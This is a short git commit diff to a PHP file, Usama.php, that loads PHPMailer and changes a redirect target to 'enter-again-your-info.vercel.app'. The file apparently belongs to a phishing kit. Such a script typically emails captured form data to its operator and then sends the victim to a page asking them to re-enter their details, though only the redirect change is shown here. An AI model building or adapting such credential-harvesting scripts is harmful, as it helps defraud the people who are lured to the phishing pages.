10ec00a28c5ce84deb955cc8c87b0b44e5863052
adiwalfare <ronimawiads@gmail.com>
2025-07-15 17:30:39 +0500

    Update Usama.php

--- Usama.php
+++ Usama.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://usama-pass.vercel.app/");
+header("Location: https://enter-again-your-info.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
